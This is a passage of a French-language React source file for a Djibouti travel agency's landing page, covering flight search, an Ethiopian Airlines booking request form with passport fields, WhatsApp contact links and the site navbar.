          background: "white", borderRadius: 12, boxShadow: "0 12px 40px rgba(11,31,58,0.22)", border: `1px solid ${T.gray100}`,
          padding: 6, maxHeight: 300, overflowY: "auto", boxSizing: "border-box",
        }}>
          {matches.map((a) => (
            <button key={a.code} type="button"
              onMouseDown={(e) => e.preventDefault()}
              onClick={() => selectAirport(a)}
              style={{
                display: "flex", alignItems: "baseline", gap: 8, width: "100%", textAlign: "left",
                padding: "8px 10px", border: "none", background: "transparent", cursor: "pointer",
                borderRadius: 8, fontFamily: "inherit",
              }}>
              <span style={{ fontWeight: 700, color: T.navy, fontSize: 13, minWidth: 32 }}>{a.code}</span>
              <span style={{ fontSize: 12.5, color: T.gray700 }}>{a.city}</span>
              <span style={{ fontSize: 11.5, color: T.gray500, marginLeft: "auto" }}>{a.country}</span>
            </button>
          ))}
        </div>,
        document.body
      )}
    </div>
  );
}

// ── SÉLECTEUR JOUR / MOIS / ANNÉE (inspiré d'Opodo — plus simple et fiable qu'un calendrier
// en popup pour les dates de naissance / expiration, sans risque de bug d'affichage) ──
function DateSelectTriple({ value, onChange, restrict = "futureOnly" }) {
  const today = startOfDay(new Date());
  const initial = fromISO(value);
  const [day, setDay] = useState(initial ? initial.getDate() : "");
  const [month, setMonth] = useState(initial ? initial.getMonth() : "");
  const [year, setYear] = useState(initial ? initial.getFullYear() : "");

  useEffect(() => {
    const d = fromISO(value);
    setDay(d ? d.getDate() : "");
    setMonth(d ? d.getMonth() : "");
    setYear(d ? d.getFullYear() : "");
  }, [value]);

  useEffect(() => {
    if (day !== "" && month !== "" && year !== "") {
      const candidate = new Date(Number(year), Number(month), Number(day));
      const iso = toISO(candidate);
      if (iso !== value) onChange(iso);
    }
    // eslint-disable-next-line
  }, [day, month, year]);

  const years = restrict === "pastOnly"
    ? Array.from({ length: 100 }, (_, i) => today.getFullYear() - i)
    : Array.from({ length: 16 }, (_, i) => today.getFullYear() + i);

  const daysInSelectedMonth = (month !== "" && year !== "") ? new Date(Number(year), Number(month) + 1, 0).getDate() : 31;
  const dayOptions = Array.from({ length: daysInSelectedMonth }, (_, i) => i + 1);

  const selectStyle = {
    border: "none", outline: "none", fontSize: 13, fontWeight: 600, color: T.navy,
    fontFamily: "inherit", background: "transparent", flex: 1, minWidth: 0, WebkitAppearance: "none",
  };

  return (
    <div style={{ display: "flex", gap: 4, width: "100%" }}>
      <select value={day} onChange={(e) => setDay(e.target.value === "" ? "" : Number(e.target.value))} style={selectStyle}>
        <option value="">Jour</option>
        {dayOptions.map((dd) => <option key={dd} value={dd}>{dd}</option>)}
      </select>
      <select value={month} onChange={(e) => setMonth(e.target.value === "" ? "" : Number(e.target.value))} style={selectStyle}>
        <option value="">Mois</option>
        {MONTHS_FR.map((m, i) => <option key={i} value={i}>{m}</option>)}
      </select>
      <select value={year} onChange={(e) => setYear(e.target.value === "" ? "" : Number(e.target.value))} style={selectStyle}>
        <option value="">Année</option>
        {years.map((y) => <option key={y} value={y}>{y}</option>)}
      </select>
    </div>
  );
}

function FlightSearchWidget() {
  const [tripType, setTripType] = useState("roundtrip"); // roundtrip | oneway | multi | manage
  const [form, setForm] = useState({ origin: "", destination: "", departureDate: "", returnDate: "", passengers: "1" });
  const [multiSlices, setMultiSlices] = useState([
    { origin: "", destination: "", departureDate: "" },
    { origin: "", destination: "", departureDate: "" },
  ]);
  const [offers, setOffers] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [selectedOffer, setSelectedOffer] = useState(null);
  const [customer, setCustomer] = useState({
    name: "", phone: "", email: "", notes: "",
    birthdate: "", gender: "Male", idNumber: "", issuingCountry: "DJ", expiryDate: "",
    paymentMethod: "agency_cash",
  });
  const [sent, setSent] = useState(false);
  const [sending, setSending] = useState(false);
  const [manageForm, setManageForm] = useState({ reference: "", lastName: "", phone: "" });
  const [manageSent, setManageSent] = useState(false);

  function handleChange(e) {
    const { id, value } = e.target;
    setForm((f) => ({ ...f, [id]: id === "origin" || id === "destination" ? value.toUpperCase() : value }));
  }

  function swapOriginDestination() {
    setForm((f) => ({ ...f, origin: f.destination, destination: f.origin }));
  }

  function updateMultiSlice(index, field, value) {
    setMultiSlices((prev) => prev.map((s, i) => i === index
      ? { ...s, [field]: (field === "origin" || field === "destination") ? value.toUpperCase() : value }
      : s));
  }

  function addMultiSlice() {
    setMultiSlices((prev) => [...prev, { origin: "", destination: "", departureDate: "" }]);
  }

  function removeMultiSlice(index) {
    setMultiSlices((prev) => prev.length > 2 ? prev.filter((_, i) => i !== index) : prev);
  }

  function selectTripType(type) {
    setTripType(type);
    setOffers(null);
    setError("");
  }

  function handleManageSubmit(e) {
    e.preventDefault();
    if (!manageForm.reference.trim() || !manageForm.lastName.trim()) {
      alert("Merci de remplir la référence et le nom.");
      return;
    }
    const message = `Bonjour, je souhaite gérer ma réservation.\nRéférence : ${manageForm.reference}\nNom : ${manageForm.lastName}\nTéléphone : ${manageForm.phone || "-"}`;
    window.open(`https://wa.me/25377646406?text=${encodeURIComponent(message)}`, "_blank");
    setManageSent(true);
  }

  async function handleSearch(e) {
    e.preventDefault();
    if (tripType === "multi") {
      const incomplete = multiSlices.some((s) => !s.origin || !s.destination || !s.departureDate);
      if (incomplete) { alert("Merci de renseigner l'origine, la destination et la date pour chaque vol."); return; }
    } else {
      if (!form.origin || !form.destination || !form.departureDate) {
        alert("Merci de renseigner l'origine, la destination et la date de départ.");
        return;
      }
      if (tripType === "roundtrip" && !form.returnDate) {
        alert("Merci de sélectionner une date de retour.");
        return;
      }
    }
    setLoading(true);
    setError("");
    setOffers(null);
    try {
      const payload = tripType === "multi"
        ? { slices: multiSlices, passengers: form.passengers }
        : {
            origin: form.origin,
            destination: form.destination,
            departureDate: form.departureDate,
            returnDate: tripType === "roundtrip" ? (form.returnDate || undefined) : undefined,
            passengers: form.passengers,
          };
     const resp = await fetch("/api/search-flights-ethiopian", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const data = await resp.json();
      if (!resp.ok) setError(data.error || "Erreur inconnue");
      else setOffers(data.offers || []);
    } catch (err) {
      setError("Erreur réseau, réessayez.");
    } finally {
      setLoading(false);
    }
  }

  function openReserveModal(offer) {
    setSelectedOffer(offer);
    setSent(false);
    setCustomer({
      name: "", phone: "", email: "", notes: "",
      birthdate: "", gender: "Male", idNumber: "", issuingCountry: "DJ", expiryDate: "",
      paymentMethod: "agency_cash",
    });
  }

  async function handleReserve() {
    if (!customer.name.trim() || !customer.phone.trim()) {
      alert("Merci de remplir au moins le nom et le téléphone.");
      return;
    }
    if (!customer.birthdate || !customer.idNumber.trim() || !customer.expiryDate) {
      alert("Merci de remplir la date de naissance, le numéro de passeport et sa date d'expiration (obligatoires pour Ethiopian Airlines).");
      return;
    }
    setSending(true);
    try {
      const nameParts = customer.name.trim().split(/\s+/);
      const givenName = nameParts[0] || "N/A";
      const surname = nameParts.slice(1).join(" ") || nameParts[0] || "N/A";

      const resp = await fetch("/api/reserve-ethiopian", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          responseId: selectedOffer.responseId,
          offerId: selectedOffer.offerId,
          offerItemId: selectedOffer.offerItemId,
          totalAmount: selectedOffer.totalAmount,
          currency: selectedOffer.currency,
          paymentMethod: customer.paymentMethod,
          passenger: {
            ptc: "ADT",
            birthdate: customer.birthdate,
            gender: customer.gender,
            title: customer.gender === "Female" ? "MRS" : "MR",
            givenName,
            surname,
            idNumber: customer.idNumber,
            idType: "P",
            issuingCountry: customer.issuingCountry,
            citizenshipCountry: customer.issuingCountry,
            issueDate: new Date().toISOString().slice(0, 10),
            expiryDate: customer.expiryDate,
            phone: customer.phone,
            phoneCountryCode: "253",
            email: customer.email || undefined,
          },
        }),
      });
      const data = await resp.json();
      if (data.orderId) setSent(true);
      else alert("Erreur lors de l'envoi de la demande, réessayez. " + (data.error || ""));
    } catch (err) {
      alert("Erreur réseau, réessayez.");
    } finally {
      setSending(false);
    }
  }

  return (
    <section id="recherche" style={{ padding: "96px 40px", background: T.gray50 }}>
      <div style={{ maxWidth: 1000, margin: "0 auto" }}>
        <div style={{ textAlign: "center", marginBottom: 48 }}>
          <div style={{ display: "inline-block", background: `${T.blue}15`, color: T.blue, fontSize: 11, fontWeight: 700, letterSpacing: 3, padding: "6px 16px", borderRadius: 30, marginBottom: 16 }}>RECHERCHE EN DIRECT</div>
          <h2 style={{ fontFamily: "'Playfair Display', serif", fontSize: 46, fontWeight: 700, color: T.navy }}>
            Trouvez votre <span style={{ color: T.blue }}>vol</span>
          </h2>
        </div>

        {/* Onglets externes, comme les vrais sites de compagnies (Air France, Turkish Airlines) */}
        <div style={{ display: "flex", justifyContent: "center", gap: 4, marginBottom: 14 }}>
          {[
            ["book", "Réserver un vol"],
            ["manage", "Gérer ma réservation"],
          ].map(([key, label]) => {
            const active = (key === "manage") ? tripType === "manage" : tripType !== "manage";
            return (
              <button key={key} type="button"
                onClick={() => selectTripType(key === "manage" ? "manage" : "roundtrip")}
                style={{
                  padding: "10px 22px", border: "none", borderRadius: "10px 10px 0 0",
                  background: active ? "white" : "transparent", color: active ? T.navy : "rgba(11,31,58,0.5)",
                  fontWeight: active ? 700 : 500, fontSize: 14, cursor: "pointer",
                  borderBottom: active ? `3px solid ${T.gold}` : "3px solid transparent",
                }}>{label}</button>
            );
          })}
        </div>

        <div style={{ background: "white", borderRadius: 20, boxShadow: "0 8px 32px rgba(11,31,58,0.1)", border: `1px solid ${T.gray100}`, marginBottom: 32 }}>

          {/* Type de vol (uniquement en mode Réserver) */}
          {tripType !== "manage" && (
            <div style={{ display: "flex", gap: 22, alignItems: "center", padding: "16px 24px", borderBottom: `1px solid ${T.gray100}`, flexWrap: "wrap" }}>
              {[
                ["roundtrip", "Aller-retour"],
                ["oneway", "Aller simple"],
                ["multi", "Multi-destination"],
              ].map(([key, label]) => (
                <label key={key} style={{ display: "flex", alignItems: "center", gap: 7, cursor: "pointer", fontSize: 13.5, fontWeight: tripType === key ? 700 : 500, color: tripType === key ? T.navy : T.gray500 }}>
                  <span style={{
                    width: 16, height: 16, borderRadius: "50%", border: `2px solid ${tripType === key ? T.blue : T.gray300}`,
                    display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
                  }}>
                    {tripType === key && <span style={{ width: 8, height: 8, borderRadius: "50%", background: T.blue }} />}
                  </span>
                  <input type="radio" name="tripType" checked={tripType === key} onChange={() => selectTripType(key)} style={{ display: "none" }} />
                  {label}
                </label>
              ))}
            </div>
          )}

          <div style={{ padding: 24 }}>

          {tripType === "manage" ? (
            <form onSubmit={handleManageSubmit} style={{ padding: 28, maxWidth: 440, margin: "0 auto" }}>
              {manageSent ? (
                <p style={{ color: T.navy, fontWeight: 700, textAlign: "center", lineHeight: 1.6 }}>
                  ✅ Ta demande a été envoyée sur WhatsApp. Notre équipe te répond rapidement.
                </p>
              ) : (
                <>
                  <p style={{ fontSize: 14, color: T.gray500, marginBottom: 20, textAlign: "center" }}>
                    Entre les infos de ta réservation, on te répond directement sur WhatsApp.
                  </p>
                  <input placeholder="Référence de réservation" required value={manageForm.reference}
                    onChange={(e) => setManageForm((m) => ({ ...m, reference: e.target.value }))}
                    style={{ ...inputStyle, width: "100%", marginBottom: 10, boxSizing: "border-box" }} />
                  <input placeholder="Nom de famille" required value={manageForm.lastName}
                    onChange={(e) => setManageForm((m) => ({ ...m, lastName: e.target.value }))}
                    style={{ ...inputStyle, width: "100%", marginBottom: 10, boxSizing: "border-box" }} />
                  <input type="tel" placeholder="Téléphone (optionnel)" value={manageForm.phone}
                    onChange={(e) => setManageForm((m) => ({ ...m, phone: e.target.value }))}
                    style={{ ...inputStyle, width: "100%", marginBottom: 18, boxSizing: "border-box" }} />
                  <button type="submit" style={{
                    width: "100%", padding: 14, background: "#25D366", color: "white",
                    border: "none", borderRadius: 10, fontSize: 14, fontWeight: 700, cursor: "pointer",
                    display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                  }}><WhatsAppIcon size={16}/> Envoyer sur WhatsApp</button>
                </>
              )}
            </form>
          ) : tripType === "multi" ? (
            <form onSubmit={handleSearch}>
              {multiSlices.map((s, i) => (
                <div key={i} style={{ display: "flex", gap: 10, flexWrap: "wrap", alignItems: "center", marginBottom: 14, paddingBottom: 14, borderBottom: i < multiSlices.length - 1 ? `1px solid ${T.gray100}` : "none" }}>
                  <span style={{ display: "flex", alignItems: "center", justifyContent: "center", width: 24, height: 24, borderRadius: "50%", background: `${T.blue}12`, color: T.blue, fontSize: 11, fontWeight: 700, flexShrink: 0 }}>{i + 1}</span>
                  <div style={{ flex: "1 1 100px", display: "flex", alignItems: "center", border: `1px solid ${T.gray300}`, borderRadius: 10, padding: "10px 12px" }}>
                    <AirportField
                      value={s.origin}
                      onChange={(v) => updateMultiSlice(i, "origin", v)}
                      placeholder="Origine (JIB)"
                      icon={SearchIcons.takeoff({ size: 15, color: T.gray500 })}
                    />
                  </div>
                  <div style={{ flex: "1 1 100px", display: "flex", alignItems: "center", border: `1px solid ${T.gray300}`, borderRadius: 10, padding: "10px 12px" }}>
                    <AirportField
                      value={s.destination}
                      onChange={(v) => updateMultiSlice(i, "destination", v)}
                      placeholder="Destination (CDG)"
                      icon={SearchIcons.landing({ size: 15, color: T.gray500 })}
                    />
                  </div>
                  <div style={{ flex: "1 1 140px", display: "flex", alignItems: "center", border: `1px solid ${T.gray300}`, borderRadius: 10, padding: "10px 12px" }}>
                    <DatePickerField
                      mode="single"
                      value={s.departureDate}
                      onChangeSingle={(d) => updateMultiSlice(i, "departureDate", d)}
                      label="Date"
                    />
                  </div>
                  {multiSlices.length > 2 && (
                    <button type="button" onClick={() => removeMultiSlice(i)} style={{
                      border: "none", background: "none", color: "#B00020", cursor: "pointer", padding: 6, display: "flex",
                    }}>{SearchIcons.trash({ size: 16, color: "#B00020" })}</button>
                  )}
                </div>
              ))}
              <div style={{ display: "flex", gap: 12, alignItems: "center", flexWrap: "wrap", marginTop: 4 }}>
                <button type="button" onClick={addMultiSlice} style={{
                  display: "flex", alignItems: "center", gap: 6, padding: "10px 16px", borderRadius: 8, border: `1px dashed ${T.blue}`, background: "none",
                  color: T.blue, fontSize: 13, fontWeight: 600, cursor: "pointer",
                }}>{SearchIcons.plus({ size: 13 })} Ajouter un vol</button>
                <div style={{ display: "flex", alignItems: "center", gap: 8, border: `1px solid ${T.gray300}`, borderRadius: 10, padding: "10px 12px" }}>
                  {SearchIcons.users({ size: 15, color: T.gray500 })}
                  <select id="passengers" value={form.passengers} onChange={handleChange} style={{ border: "none", outline: "none", fontSize: 13, fontWeight: 600, color: T.navy, fontFamily: "inherit", background: "transparent" }}>
                    <option value="1">1 passager</option>
                    <option value="2">2 passagers</option>
                    <option value="3">3 passagers</option>
                    <option value="4">4 passagers</option>
                  </select>
                </div>
                <button type="submit" disabled={loading} style={{
                  marginLeft: "auto", display: "flex", alignItems: "center", gap: 8, padding: "13px 30px", background: `linear-gradient(135deg,${T.blue},${T.blueL})`,
                  color: "white", border: "none", borderRadius: 10, fontSize: 14, fontWeight: 700, cursor: "pointer",
                }}>{SearchIcons.search({ size: 15, color: "white" })} {loading ? "Recherche…" : "Rechercher"}</button>
              </div>
            </form>
          ) : (
          <form onSubmit={handleSearch} className="flight-search-form" style={{
            display: "flex", flexWrap: "wrap", gap: 12, alignItems: "stretch",
          }}>
            {/* Pilule Origine ⇄ Destination */}
            <div style={{
              flex: "2 1 320px", display: "flex", alignItems: "stretch", border: `1.5px solid ${T.gray300}`,
              borderRadius: 100, overflow: "hidden", background: "white",
            }}>
              <div style={{ flex: 1, display: "flex", alignItems: "center", padding: "14px 20px", minWidth: 0 }}>
                <AirportField
                  value={form.origin}
                  onChange={(v) => setForm((f) => ({ ...f, origin: v }))}
                  placeholder="Origine (JIB)"
                  icon={SearchIcons.takeoff({ size: 15, color: T.gray500 })}
                />
              </div>
              <button type="button" onClick={swapOriginDestination} title="Inverser" style={{
                border: `1.5px solid ${T.gray300}`, background: "white", color: T.blue, width: 32, height: 32, alignSelf: "center",
                borderRadius: "50%", cursor: "pointer", flexShrink: 0, display: "flex", alignItems: "center", justifyContent: "center",
                boxShadow: "0 1px 4px rgba(11,31,58,0.1)",
              }}>{SearchIcons.swap({ size: 13, color: T.blue })}</button>
              <div style={{ flex: 1, display: "flex", alignItems: "center", padding: "14px 20px", minWidth: 0 }}>
                <AirportField
                  value={form.destination}
                  onChange={(v) => setForm((f) => ({ ...f, destination: v }))}
                  placeholder="Destination (CDG)"
                  icon={SearchIcons.landing({ size: 15, color: T.gray500 })}
                />
              </div>
            </div>

            {/* Pilule Dates */}
            <div style={{
              flex: "1.5 1 220px", display: "flex", alignItems: "center", border: `1.5px solid ${T.gray300}`,
              borderRadius: 100, padding: "14px 18px", background: "white",
            }}>
              {tripType === "roundtrip" ? (
                <DatePickerField
                  mode="range"
                  startValue={form.departureDate}
                  endValue={form.returnDate}
                  onChangeRange={(start, end) => setForm((f) => ({ ...f, departureDate: start, returnDate: end || "" }))}
                  label="Aller — Retour"
                />
              ) : (
                <DatePickerField
                  mode="single"
                  value={form.departureDate}
                  onChangeSingle={(d) => setForm((f) => ({ ...f, departureDate: d }))}
                  label="Date de départ"
                />
              )}
            </div>

            {/* Pilule Passagers */}
            <div style={{
              flex: "1 1 150px", display: "flex", alignItems: "center", gap: 8, border: `1.5px solid ${T.gray300}`,
              borderRadius: 100, padding: "14px 18px", background: "white",
            }}>
              {SearchIcons.users({ size: 15, color: T.gray500 })}
              <select id="passengers" value={form.passengers} onChange={handleChange}
                style={{ border: "none", outline: "none", width: "100%", fontSize: 13, fontWeight: 600, color: T.navy, fontFamily: "inherit", background: "transparent" }}>
                <option value="1">1 passager</option>
                <option value="2">2 passagers</option>
                <option value="3">3 passagers</option>
                <option value="4">4 passagers</option>
              </select>
            </div>

            {/* Bouton Rechercher */}
            <button type="submit" className="btn-primary" disabled={loading} style={{
              flex: "1 1 160px", padding: "0 30px", background: `linear-gradient(135deg,${T.blue},${T.blueL})`,
              color: "white", border: "none", borderRadius: 100, fontSize: 15, fontWeight: 700,
              cursor: "pointer", transition: "all 0.2s", display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
              boxShadow: `0 6px 20px ${T.blue}40`,
            }}>{SearchIcons.search({ size: 16, color: "white" })} {loading ? "Recherche…" : "Rechercher"}</button>
          </form>
          )}
          </div>
        </div>

        {error && <p style={{ color: "#B00020", textAlign: "center" }}>Erreur : {error}</p>}
        {offers && offers.length === 0 && <p style={{ textAlign: "center", color: T.gray500 }}>Aucun vol trouvé pour ces critères.</p>}

        {offers && offers.map((offer) => {
          const depDateTime = offer.departureDate && offer.departureTime ? `${offer.departureDate}T${offer.departureTime}` : null;
          const arrDateTime = offer.arrivalDate && offer.arrivalTime ? `${offer.arrivalDate}T${offer.arrivalTime}` : null;
          return (
            <div key={offer.offerItemId} style={{
              display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 12,
              background: "white", borderRadius: 16, padding: 20, marginBottom: 14,
              boxShadow: "0 4px 20px rgba(0,0,0,0.06)", border: `1px solid ${T.gray100}`,
            }}>
              <div>
                <div style={{ fontWeight: 700, color: T.navy, fontSize: 15 }}>{offer.airline} — {offer.departureAirport} → {offer.arrivalAirport}</div>
                <div style={{ fontSize: 12, color: T.gray500, marginTop: 4 }}>
                  {depDateTime ? `Départ ${new Date(depDateTime).toLocaleString("fr-FR")}` : "Horaire à confirmer"}
                  {arrDateTime ? ` — Arrivée ${new Date(arrDateTime).toLocaleString("fr-FR")}` : ""}
                  {" "}({offer.stops > 0 ? `${offer.stops} escale(s)` : "direct"})
                </div>
              </div>
              <div style={{ textAlign: "right" }}>
                <div style={{ fontWeight: 800, color: T.blue, fontSize: 18, fontFamily: "'Playfair Display', serif" }}>{offer.totalAmount} {offer.currency}</div>
                <div style={{ fontSize: 10, color: T.gray500, marginTop: 2 }}>Prix Ethiopian Airlines</div>
                <button onClick={() => openReserveModal(offer)} className="btn-gold" style={{
                  marginTop: 8, padding: "9px 20px", background: `linear-gradient(135deg,${T.gold},${T.goldD})`,
                  color: "white", border: "none", borderRadius: 10, fontSize: 13, fontWeight: 600, cursor: "pointer",
                }}>Réserver →</button>
              </div>
            </div>
          );
        })}
      </div>

      {selectedOffer && (
        <div style={{ display: "flex", position: "fixed", inset: 0, background: "rgba(11,31,58,0.6)", alignItems: "center", justifyContent: "center", zIndex: 1000, padding: 20 }}>
          <div style={{ background: "white", padding: 32, borderRadius: 20, maxWidth: 420, width: "100%" }}>
            {sent ? (
              <>
                <p style={{ color: T.navy, fontWeight: 700, fontSize: 16, lineHeight: 1.6 }}>
                  ✅ Votre demande a bien été envoyée ! Notre équipe vous contacte rapidement pour confirmer.
                </p>
                <button onClick={() => setSelectedOffer(null)} style={{
                  marginTop: 16, padding: "10px 20px", background: T.navy, color: "white",
                  border: "none", borderRadius: 10, cursor: "pointer", fontWeight: 600,
                }}>Fermer</button>
              </>
            ) : (
              <>
                <h3 style={{ fontFamily: "'Playfair Display', serif", fontSize: 22, color: T.navy, marginBottom: 4 }}>Demande de réservation</h3>
                <div style={{ fontSize: 13, color: T.gray500, marginBottom: 20 }}>
                  {selectedOffer.airline} — {selectedOffer.departureAirport} → {selectedOffer.arrivalAirport} — {selectedOffer.totalAmount} {selectedOffer.currency}
                </div>
                <input placeholder="Nom complet" required value={customer.name}
                  onChange={(e) => setCustomer((c) => ({ ...c, name: e.target.value }))}
                  style={{ ...inputStyle, width: "100%", marginBottom: 10, boxSizing: "border-box" }} />
                <input type="tel" placeholder="Téléphone (WhatsApp)" required value={customer.phone}
                  onChange={(e) => setCustomer((c) => ({ ...c, phone: e.target.value }))}
                  style={{ ...inputStyle, width: "100%", marginBottom: 10, boxSizing: "border-box" }} />
                <input type="email" placeholder="Email (optionnel)" value={customer.email}
                  onChange={(e) => setCustomer((c) => ({ ...c, email: e.target.value }))}
                  style={{ ...inputStyle, width: "100%", marginBottom: 10, boxSizing: "border-box" }} />

                <div style={{ fontSize: 11, color: T.gray500, marginBottom: 6, marginTop: 4 }}>Requis par Ethiopian Airlines pour l'émission du billet :</div>
                <div style={{ display: "flex", gap: 8, marginBottom: 10 }}>
                  <div style={{ ...inputStyle, flex: 1, boxSizing: "border-box", display: "flex", alignItems: "center", padding: "13px 10px" }}>
                    <DateSelectTriple
                      restrict="pastOnly"
                      value={customer.birthdate}
                      onChange={(d) => setCustomer((c) => ({ ...c, birthdate: d }))}
                    />
                  </div>
                  <select value={customer.gender}
                    onChange={(e) => setCustomer((c) => ({ ...c, gender: e.target.value }))}
                    style={{ ...inputStyle, flex: 1, boxSizing: "border-box" }}>
                    <option value="Male">Homme</option>
                    <option value="Female">Femme</option>
                  </select>
                </div>
                <input placeholder="Numéro de passeport" required value={customer.idNumber}
                  onChange={(e) => setCustomer((c) => ({ ...c, idNumber: e.target.value }))}
                  style={{ ...inputStyle, width: "100%", marginBottom: 10, boxSizing: "border-box" }} />
                <div style={{ display: "flex", gap: 8, marginBottom: 10 }}>
                  <input placeholder="Pays émetteur (ex: DJ)" required maxLength={2} value={customer.issuingCountry}
                    onChange={(e) => setCustomer((c) => ({ ...c, issuingCountry: e.target.value.toUpperCase().slice(0, 2) }))}
                    style={{ ...inputStyle, flex: 1, boxSizing: "border-box" }} />
                  <div style={{ ...inputStyle, flex: 1, boxSizing: "border-box", display: "flex", alignItems: "center", padding: "13px 10px" }}>
                    <DateSelectTriple
                      restrict="futureOnly"
                      value={customer.expiryDate}
                      onChange={(d) => setCustomer((c) => ({ ...c, expiryDate: d }))}
                    />
                  </div>
                </div>
                <textarea placeholder="Remarques (optionnel)" rows={2} value={customer.notes}
                  onChange={(e) => setCustomer((c) => ({ ...c, notes: e.target.value }))}
                  style={{ ...inputStyle, width: "100%", marginBottom: 16, boxSizing: "border-box" }} />

                <div style={{ fontSize: 11, color: T.gray500, marginBottom: 6 }}>Comment souhaitez-vous régler ?</div>
                <div style={{ display: "flex", flexDirection: "column", gap: 8, marginBottom: 16 }}>
                  {[
                    { value: "agency_cash", label: "Espèces à l'agence", note: null },
                    { value: "credit_card", label: "Carte de crédit", note: "L'agence vous contactera pour finaliser le paiement" },
                    { value: "mobile_money", label: "Mobile Money (D-Money / Waafi)", note: "L'agence vous contactera pour finaliser le paiement" },
                  ].map((opt) => (
                    <label key={opt.value} style={{
                      display: "flex", alignItems: "center", gap: 10, padding: "10px 12px",
                      border: `1.5px solid ${customer.paymentMethod === opt.value ? T.blue : T.gray300}`,
                      borderRadius: 10, cursor: "pointer",
                      background: customer.paymentMethod === opt.value ? `${T.blue}0D` : "white",
                    }}>
                      <input type="radio" name="paymentMethod" value={opt.value}
                        checked={customer.paymentMethod === opt.value}
                        onChange={() => setCustomer((c) => ({ ...c, paymentMethod: opt.value }))} />
                      <div>
                        <div style={{ fontSize: 13.5, fontWeight: 600, color: T.navy }}>{opt.label}</div>
                        {opt.note && <div style={{ fontSize: 10.5, color: T.gray500 }}>{opt.note}</div>}
                      </div>
                    </label>
                  ))}
                </div>
                <div style={{ fontSize: 10.5, color: T.gray500, marginBottom: 16, lineHeight: 1.4 }}>
                  Cette étape crée votre demande de réservation. Le billet vous sera envoyé par email dès que le paiement sera confirmé par notre équipe.
                </div>

                <div style={{ display: "flex", gap: 10 }}>
                  <button onClick={handleReserve} disabled={sending} style={{
                    flex: 1, padding: 12, background: `linear-gradient(135deg,${T.blue},${T.blueL})`,
                    color: "white", border: "none", borderRadius: 10, cursor: "pointer", fontWeight: 600,
                  }}>{sending ? "Envoi…" : "Envoyer la demande"}</button>
                  <button onClick={() => setSelectedOffer(null)} style={{
                    padding: "12px 18px", background: T.gray100, border: "none", borderRadius: 10, cursor: "pointer", color: T.navy,
                  }}>Annuler</button>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </section>
  );
}

// ══════════════════════════════════════════════════════════════════════════════
// APP PRINCIPALE
// ══════════════════════════════════════════════════════════════════════════════
export default function AlaminLanding() {
  const [activeTestimonial, setActiveTestimonial] = useState(0);
  const [scrolled, setScrolled] = useState(false);
  const [activeSection, setActiveSection] = useState("accueil");
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);

  useEffect(() => {
    const onScroll = () => setScrolled(window.scrollY > 60);
    window.addEventListener("scroll", onScroll);
    return () => window.removeEventListener("scroll", onScroll);
  }, []);

  useEffect(() => {
    const t = setInterval(() => setActiveTestimonial(p => (p+1) % TESTIMONIALS.length), 5000);
    return () => clearInterval(t);
  }, []);

  const scrollTo = (id) => {
    document.getElementById(id)?.scrollIntoView({ behavior:"smooth" });
    setActiveSection(id);
    setMobileMenuOpen(false);
  };

  return (
    <div style={{ minHeight:"100vh" }}>
      <style>{GLOBAL_CSS}</style>

      {/* ══ NAVBAR ══ */}
      <nav style={{
        position:"fixed", top:0, left:0, right:0, zIndex:100,
        background: scrolled ? "rgba(11,31,58,0.97)" : "transparent",
        backdropFilter: scrolled ? "blur(20px)" : "none",
        borderBottom: scrolled ? "1px solid rgba(255,255,255,0.08)" : "none",
        transition:"all 0.4s ease",
        padding:"0 40px",
      }}>
        <div style={{ maxWidth:1200, margin:"0 auto", height:72, display:"flex", alignItems:"center", justifyContent:"space-between" }}>
          <Logo size={44} light />
          <div className="desktop-nav-links" style={{ display:"flex", gap:32, alignItems:"center" }}>
            {[["accueil","Accueil"],["recherche","Rechercher un vol"],["services","Services"],["destinations","Djibouti"],["packages","Packages"],["agence","Contact"]].map(([id,label])=>(
              <button key={id} className="nav-link" onClick={()=>scrollTo(id)} style={{
                background:"none", border:"none", cursor:"pointer",
                color: activeSection===id ? T.sky : "rgba(255,255,255,0.8)",
                fontFamily:"inherit", fontSize:14, fontWeight:500, letterSpacing:0.5,
                transition:"color 0.2s", padding:"4px 0",
                borderBottom: activeSection===id ? `2px solid ${T.sky}` : "2px solid transparent",
              }}>{label}</button>
            ))}
          </div>
          <div className="desktop-nav-actions" style={{ display:"flex", gap:12 }}>
            <a href="https://wa.me/25377646406" target="_blank" rel="noopener noreferrer" style={{
              display:"flex", alignItems:"center", gap:6, padding:"8px 18px",
              background:"#25D366", color:"white", borderRadius:8,
              fontSize:13, fontWeight:600, textDecoration:"none", transition:"all 0.2s"
            }}><WhatsAppIcon size={16}/> WhatsApp</a>
            <button className="btn-gold" onClick={()=>scrollTo("packages")} style={{
              padding:"8px 20px", background:`linear-gradient(135deg,${T.gold},${T.goldD})`,
              color:"white", border:"none", borderRadius:8, fontSize:13, fontWeight:600,
              cursor:"pointer", transition:"all 0.2s"
            }}>Réserver →</button>
          </div>
          <button
            className="mobile-menu-btn"
            onClick={() => setMobileMenuOpen(o => !o)}
            aria-label="Menu"
            style={{
              alignItems:"center", justifyContent:"center", width:40, height:40,
              background:"rgba(255,255,255,0.08)", border:"none", borderRadius:8,
              cursor:"pointer", flexDirection:"column", gap:4,
            }}
          >
            <span style={{ width:20, height:2, background:"white", borderRadius:2, transition:"all 0.2s", transform: mobileMenuOpen ? "translateY(6px) rotate(45deg)" : "none" }} />
            <span style={{ width:20, height:2, background:"white", borderRadius:2, opacity: mobileMenuOpen ? 0 : 1, transition:"all 0.2s" }} />
            <span style={{ width:20, height:2, background:"white", borderRadius:2, transition:"all 0.2s", transform: mobileMenuOpen ? "translateY(-6px) rotate(-45deg)" : "none" }} />
          </button>
        </div>

        {/* Menu mobile déroulant */}
        {mobileMenuOpen && (
          <div style={{
            background:"rgba(6,15,30,0.98)", backdropFilter:"blur(20px)",
            padding:"12px 20px 24px", display:"flex", flexDirection:"column", gap:4,
            borderTop:"1px solid rgba(255,255,255,0.08)",
          }}>
